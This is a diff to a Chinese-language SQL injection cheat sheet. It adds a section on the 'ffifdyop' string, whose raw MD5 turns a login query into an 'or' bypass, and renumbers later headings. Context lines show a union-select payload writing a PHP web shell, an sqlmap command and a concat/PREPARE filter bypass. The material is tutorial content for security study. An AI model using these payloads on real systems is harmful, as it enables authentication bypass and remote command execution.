@@ -588,7 +588,27 @@ sqlmap -u "http://xxx.com/xxx.php" --form
 
 
 
-## 0x0b load_file文件读取
+## 0x0b ffifdyop注入破解MD5
+
+“ffifdyop”这一字符串的md5值，转化成字符串开头有：`'or'`，可以用于带有MD5的SQL注入。
+
+例如：
+
+```sql
+select * from 'admin' where username='.md5($password, True)'
+```
+
+当`$password='ffifdyop'`时，SQL语句就变成这样：
+
+```sql
+select * from 'admin' where username=''or'6xxxx'
+```
+
+经过MD5并转换成字符串之后会引起SQL注入。
+
+
+
+## 0x0c load_file文件读取
 
 #### 1. load_file注意事项
 
@@ -653,7 +673,7 @@ show global variables\G;
 
 
 
-## 0x0c outfile写入文件 
+## 0x0d outfile写入文件 
 
 #### 1. 需要开启的配置
 
@@ -715,7 +735,7 @@ id=1' union select 1,"<pre><body><?php @system($_GET['cc']);?></body></pre>",3,4
 
 
 
-## 0x0d 绕过技巧
+## 0x0e 绕过技巧
 
 #### 1. 双写绕过
 
@@ -787,7 +807,7 @@ id=1';set @sql=concat('s','elect * from `db`');PREPARE pre FROM @sql;EXECUTE pre
 
 
 
-## 0x0e MySQL知识点
+## 0x0f MySQL知识点
 
 #### 1. MySQL函数
 
@@ -848,7 +868,7 @@ limit 20 是限制了只取20条记录，\\G转化成容易看的形式。
 
 
 
-## 0x0f SQL注入防御
+## 0x10 SQL注入防御
 
 #### 1. php配置层面的防御
 
